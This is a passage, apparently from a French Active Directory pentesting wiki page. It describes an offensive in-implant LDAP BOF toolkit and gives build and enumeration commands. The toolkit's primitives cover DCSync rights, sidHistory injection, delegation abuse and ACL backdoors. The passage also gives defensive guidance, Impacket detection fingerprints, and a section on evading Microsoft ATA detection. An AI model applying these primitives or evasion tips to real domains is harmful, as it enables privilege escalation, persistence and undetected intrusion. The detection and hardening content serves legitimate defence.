La [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) réimplémente des primitives LDAP de type bloodyAD sous forme de Beacon Object Files x64 qui s’exécutent entièrement dans un implant on-host (par exemple, Adaptix C2). Les opérateurs compilent le pack avec `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, chargent `ldap.axs`, puis exécutent `ldap <subcommand>` depuis le beacon. Tout le trafic utilise le contexte de sécurité de la session ouverte, via LDAP (389) avec signature/chiffrement ou LDAPS (636) avec approbation automatique du certificat : aucun proxy socks ni artefact sur disque n’est nécessaire.<sup>[[4]](#references)</sup>

### Énumération LDAP côté implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` et `get-groupmembers` résolvent les noms courts et les chemins d’OU en DN complets, puis extraient les objets correspondants.
- `get-object`, `get-attribute` et `get-domaininfo` récupèrent des attributs arbitraires (y compris des descripteurs de sécurité), ainsi que les métadonnées de la forêt et du domaine depuis `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` et `get-rbcd` exposent directement depuis LDAP les cibles potentielles de roasting, les paramètres de délégation et les descripteurs [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) existants.
- `get-acl` et `get-writable --detailed` analysent la DACL pour répertorier les trustees, les droits (GenericAll/WriteDACL/WriteOwner/écritures d’attributs) et l’héritage, fournissant ainsi des cibles immédiates pour l’escalade de privilèges via ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Primitives d’écriture LDAP pour l’escalade et la persistance

- Les BOF de création d’objets (`add-user`, `add-computer`, `add-group`, `add-ou`) permettent à l’opérateur de préparer de nouveaux principaux ou comptes machine partout où des droits sur l’OU existent. `add-groupmember`, `set-password`, `add-attribute` et `set-attribute` permettent de détourner directement des cibles dès que des droits write-property sont identifiés.
- Les commandes axées sur les ACL, telles que `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` et `add-dcsync`, convertissent les droits WriteDACL/WriteOwner sur n’importe quel objet AD en réinitialisations de mot de passe, contrôle de l’appartenance aux groupes ou privilèges de réplication DCSync, sans laisser de traces PowerShell/ADSI. Les commandes `remove-*` correspondantes nettoient les ACE injectées.

### Délégation, roasting et abus de Kerberos

- `add-spn`/`set-spn` rendent instantanément un utilisateur compromis vulnérable au Kerberoast ; `add-asreproastable` (bascule UAC) le marque comme vulnérable à l’AS-REP roasting sans toucher au mot de passe.
- Les macros de délégation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) modifient `msDS-AllowedToDelegateTo`, les indicateurs UAC ou `msDS-AllowedToActOnBehalfOfOtherIdentity` depuis le beacon, activant des chemins d’attaque par délégation contrainte/non contrainte/RBCD et supprimant le besoin de PowerShell à distance ou de RSAT.

### Injection de sidHistory, déplacement d’OU et façonnage de la surface d’attaque

- `add-sidhistory` injecte des SID privilégiés dans l’historique SID d’un principal contrôlé (voir [Injection de SID-History](sid-history-injection.md)), offrant un héritage d’accès furtif entièrement via LDAP/LDAPS.
- `move-object` modifie le DN/OU d’ordinateurs ou d’utilisateurs, permettant à un attaquant de placer des actifs sous des droits délégués avant d’utiliser `set-password`, `add-groupmember` ou `add-spn`. Voir [Déplacement d’OU et droits hérités](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) pour les droits de déplacement et les vérifications d’héritage.
- Des commandes de suppression précisément ciblées (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permettent un retour arrière rapide après la collecte d’identifiants ou la mise en place d’une persistance par l’opérateur, en réduisant au minimum la télémétrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Quelques mesures de défense générales

[**En savoir plus sur la protection des identifiants ici.**](../stealing-credentials/credentials-protections.md)

### **Mesures de protection des identifiants**

- **Restrictions des Domain Admins** : il est recommandé de n’autoriser les Domain Admins à se connecter qu’aux Domain Controllers, et d’éviter leur utilisation sur d’autres hôtes.
- **Privilèges des comptes de service** : les services ne devraient pas être exécutés avec des privilèges Domain Admin (DA), afin de préserver la sécurité.
- **Limitation temporaire des privilèges** : la durée des tâches nécessitant des privilèges DA devrait être limitée. Par exemple : `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Atténuation des relais LDAP** : auditez les Event IDs 2889/3074/3075, puis imposez la signature LDAP et le channel binding LDAPS sur les DC/clients pour bloquer les tentatives de MITM/relais LDAP.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Empreintes au niveau protocole de l’activité Impacket

Pour détecter les pratiques AD courantes, **ne vous fiez pas uniquement aux artefacts contrôlés par l’opérateur**, comme les binaires renommés, les noms de services, les fichiers batch temporaires ou les chemins de sortie. Établissez une base de référence de la manière dont les clients Windows légitimes génèrent le trafic [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC et WMI, puis recherchez les **particularités d’implémentation** qui subsistent même après modification par l’opérateur de `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ou `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Indicateurs autonomes à forte confiance** (après validation par rapport à votre propre base de référence) :
  - Authentification DCE/RPC avec `auth_context_id = 79231 + ctx_id`
  - Remplissage du padding d’authentification DCE/RPC avec `0xff`
  - Bind Kerberos LDAP plaçant un `AP-REQ` Kerberos brut directement dans le `mechToken` SPNEGO
  - Requêtes de négociation SMB2/3 avec des valeurs `ClientGuid` évoquant de l’ASCII
  - `IWbemLevel1Login::NTLMLogin` WMI utilisant l’espace de noms non standard `//./root/cimv2`
  - Valeurs de nonce Kerberos codées en dur
- **À privilégier comme signaux de corrélation/de score** :
  - Listes d’etype Kerberos clairsemées ou dupliquées, `PA-DATA` inhabituelles/absentes, ou ordre des etype dans les TGS-REQ différent de celui de Windows natif
  - Messages NTLM Type 1 sans informations de version ou messages Type 3 avec des noms d’hôte nuls
  - NTLMSSP brut transporté dans DCE/RPC au lieu de SPNEGO, absence de trailers de vérification DCE/RPC ou incohérences entre les OID SPNEGO/Kerberos
  - Plusieurs de ces caractéristiques provenant du même hôte/utilisateur/de la même session/fenêtre temporelle sont bien plus révélatrices que n’importe quel champ faible pris isolément
- **À utiliser comme éléments d’enrichissement, pas comme alertes autonomes** :
  - Noms de fichiers par défaut, chemins de sortie, noms de services aléatoires, noms de fichiers batch temporaires, noms de comptes ordinateur par défaut et chaînes HTTP/WebDAV/RDP/MSSQL propres aux outils
  - Ces éléments sont faciles à modifier par les opérateurs et servent surtout à expliquer pourquoi un regroupement interprotocoles est suspect
- **Notes opérationnelles** :
  - Certains de ces signaux nécessitent du trafic déchiffré, l’analyse [PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ou une visibilité côté service
  - Validez-les avec des clients Samba/Linux, des appliances et des logiciels anciens avant de les transformer en alertes
  - Faites évoluer les détections de l’enrichissement -> la recherche proactive -> l’alerte à mesure que la confiance dans la base de référence augmente

### **Mise en œuvre de techniques de deception**

- La mise en œuvre de deception consiste à installer des leurres, comme des utilisateurs ou ordinateurs factices, avec des caractéristiques telles que des mots de passe qui n’expirent jamais ou l’indicateur Trusted for Delegation. Une approche détaillée comprend la création d’utilisateurs dotés de droits spécifiques ou leur ajout à des groupes hautement privilégiés.<sup>[[2]](#references)</sup>
- Voici un exemple pratique utilisant des outils comme : `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Pour en savoir plus sur le déploiement de techniques de deception, consultez [Deploy-Deception sur GitHub](https://github.com/samratashok/Deploy-Deception).

### **Détection de deception**

- **Pour les objets utilisateur** : les indicateurs suspects comprennent un ObjectSID atypique, des connexions peu fréquentes, des dates de création et un faible nombre de mots de passe incorrects.
- **Indicateurs généraux** : comparer les attributs d’objets leurres potentiels à ceux d’objets authentiques peut révéler des incohérences. Des outils comme [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) peuvent aider à repérer ces leurres.

### **Contournement des systèmes de détection**

- **Contournement de la détection Microsoft ATA** :
  - **Énumération des utilisateurs** : éviter l’énumération des sessions sur les Domain Controllers pour éviter la détection par ATA.
  - **Usurpation de tickets** : utiliser des clés **aes** pour créer des tickets aide à échapper à la détection en évitant de rétrograder vers NTLM.
  - **Attaques DCSync** : il est conseillé de les exécuter depuis un hôte qui n’est pas un Domain Controller pour éviter la détection par ATA, car une exécution directe depuis un Domain Controller déclenchera des alertes.

## References

- [1] [Guide pour attaquer les relations de confiance entre domaines](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forger des relations de confiance pour la deception dans Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [De Domain Admin à Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Collection LDAP BOF – Boîte à outils LDAP en mémoire pour l’exploitation d’Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Transformer des hachages NTLM en wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Analyse d’Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon : prise de contrôle de comptes Active Directory via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Comment gérer les modifications des connexions de canal sécurisé Netlogon associées à CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Exploration des interfaces Null Session et MS-RPC oubliées](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Le filtre SID comme frontière de sécurité entre domaines ? (Partie 4) - Recherche sur le contournement du filtrage SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Le filtre SID comme frontière de sécurité entre domaines ? (Partie 5) - Attaque de confiance Golden GMSA - de l’enfant au parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Le filtre SID comme frontière de sécurité entre domaines ? (Partie 6) - Attaque de confiance par modification du schéma - de l’enfant au parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [De DA à EA avec ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Passer des administrateurs du domaine enfant aux administrateurs d’entreprise en 5 minutes en abusant d’AD CS, suite](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Un ACE dans sa manche : concevoir des backdoors DACL Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Code source du module pre2k de NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - attribut msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
